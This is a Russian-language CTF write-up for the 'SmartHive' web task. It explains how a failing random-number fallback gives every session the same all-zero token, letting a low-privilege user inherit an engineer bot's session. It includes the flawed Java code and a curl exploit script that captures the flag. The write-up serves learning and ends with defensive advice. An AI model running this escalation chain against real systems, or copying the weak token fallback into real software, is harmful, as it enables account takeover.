# SmartHive — write-up (task16)

**Avito CTF 2026 · web (Spring Boot, broken authentication / session forgery)**
**Цель:** из учётки обычной пчелы `bee4` получить управление умными летковыми воротами → флаг.
**Дано:** `bee4 : MusicIsLife123`, сайт `https://smarthive-vzzgazuy.avitoctf.ru/`, исходники (`ru.avito.iot.hivehub`).

## Флаг

Формат `avito{...}` — переменная окружения `FLAG`, **своя на каждый инстанс**. Возвращается в поле `serviceToken` ответа `POST /api/devices/landing-gate/open`, когда сессия вызывающего разрешается в роль **ENGINEER**. Эксплойт подтверждён локально (получен `avito{SESSION_FORGERY_WORKS_local}`); живое значение снимается запуском инстанса + `exploit.sh` (ниже).

## Как я до этого дошёл (методология)

Дана Spring-Boot-система с исходниками, есть низкоправная учётка `bee4` (роль `AUDIO_OPERATOR`), нужен доступ уровня `ENGINEER` (только он открывает леток). План: (1) построить карту — роли, устройства, кто что может; (2) найти, где отдаётся флаг; (3) найти изъян, повышающий роль.

- **Карта.** Роли: `AUDIO_OPERATOR`, `ENGINEER`. Устройства: `landing-gate`/`nectar-drainage`/`brood-incubator-a` — пишет только `ENGINEER`; `hive-speakers` — `AUDIO_OPERATOR`+`ENGINEER` (**единственное, что может трогать bee4**). Флаг: `DeviceController.openLandingGate` → `DeviceRegistry.openLandingGate` → `FlagResolver.resolveFlag()` = `System.getenv("FLAG")`, за гейтом `ensureWritable(landing-gate, actor)` → нужен `ENGINEER`.
- **Тупики (проверены, всё корректно):** `ensureWritable` написан правильно; нет SQLi/mass-assignment/IDOR/path-traversal/actuator; в `/debug/logs` пароли замаскированы (утекает лишь имя инженера `BeeEng`). Значит «в лоб» роль не поднять — ищем слабость в **аутентификации/сессиях**.

## Уязвимость: подделка сессии из-за «схлопнувшегося» токена

`service/SessionService.java`, `create()`:
```java
byte[] token = new byte[32];
try { random.nextBytes(token); }
catch (RuntimeException e) {                       // SecureRandom падает на инфре
    try (Socket s = new Socket("smartrand-vzzgazuy.avitoctf.ru", 443)) {
        s.getInputStream().readNBytes(token, 0, token.length);  // сырое чтение с HTTPS-хоста → ~0 байт
    } ...
}
String id = Base64.getUrlEncoder().withoutPadding().encodeToString(token);
sessions.put(id, new SessionRecord(account.username(), ...));   // МАПА КЛЮЧУЕТСЯ ПО ТОКЕНУ
```

Цепочка, почему это дыра:
1. На инфре `SecureRandom` бросает исключение → идёт **fallback**: читает 32 байта из сокета к `smartrand:443`. Но это HTTPS-хост (и вообще отдельный челлендж), сырое чтение сокета даёт ~0 полезных байт → `token` остаётся **весь нулевой**.
2. Base64 от 32 нулей → **фиксированная строка** `AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA` (43 буквы `A`). То есть **у всех сессий один и тот же id**.
3. Хранилище сессий — это `Map`, ключ = токен. Раз ключ у всех один → **«кто последним залогинился, тот и владелец» этой единственной записи**.
4. Есть привилегированный **`MaintenanceBot`**: при выключении `hive-speakers` он `loginAsEngineer` — **сам логинится в приложение как инженер `BeeEng`**, перезаписывая общую запись сессии.
5. `bee4` **может** выключить `hive-speakers` (это его роль). После этого общая запись под тем же токеном `AAA…A` указывает на `BeeEng` — а у `bee4` в куке ровно этот токен. Значит **своя же кука bee4 теперь = сессия инженера**.

**Суть одним предложением:** генератор случайности «схлопнулся» в нули → у всех один session-id → привилегированный бот перезаписывает эту общую сессию собой → низкоправный пользователь наследует права инженера, просто переиспользуя свою куку.

## PoC (`task16/exploit.sh`)

```bash
B=<база запущенного инстанса>
# 1) логин bee4 — любая сессия получает фиксированный токен
curl -c c.jar -X POST $B/login -d 'username=bee4' -d 'password=MusicIsLife123'
#    -> Set-Cookie: HHSESSID=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# 2) триггерим бота-инженера (bee4 вправе управлять аудио-устройством)
curl -b c.jar -X POST "$B/api/devices/hive-speakers/power?enabled=false"
# 3) ждём ~4с (HIVE_BOT_DELAY_MS=2500): бот логинится как BeeEng, перезаписывая общий токен
curl -b c.jar $B/api/me          # теперь username=BeeEng, roles: [AUDIO_OPERATOR, ENGINEER]
# 4) открываем леток «инженерной» сессией -> флаг в serviceToken
curl -b c.jar -X POST $B/api/devices/landing-gate/open
#    -> {"serviceToken":"avito{...}"}
```

**Как снять живой флаг:** боевой `https://smarthive-vzzgazuy.avitoctf.ru/` — это лончер (reCAPTCHA, инстанс на 15 мин; сам Spring-app живёт на `smarthive-srv-…`). Пройди капчу в браузере, подними инстанс, подставь его базовый URL в `B=` и запусти `exploit.sh` — он напечатает флаг.

## Ложный след (Unicode-Tag стего)

В `AuthController.java`, `DeviceRegistry.java` и `static/app.js` есть невидимые Unicode-Tag символы (`U+E01xx`, `ASCII = codepoint − 0xE00F0`), все три декодируются в один и тот же **троллинг**:
`good job, take your hidden flag: https://zaletay-vh85lk0q.avitoctf.ru/` — это **не** настоящий флаг, приманка.

## Мораль
Токен сессии обязан быть непредсказуемым. Здесь фатальны две вещи: (1) **fallback-генератор случайности «тихо» деградировал в нули** (никогда не делай «резервный» источник энтропии, который может вернуть предсказуемое) — все сессии схлопнулись в один id; (2) хранилище сессий, ключуемое по токену, при коллизии id даёт «last-write-wins», а привилегированный бот этим и перезаписывает чужую сессию собой. Правильно: session-id из криптостойкого ГСЧ, падение ГСЧ → отказ в обслуживании, а не слабый токен; и никогда не завязывать identity на общий/предсказуемый ключ.
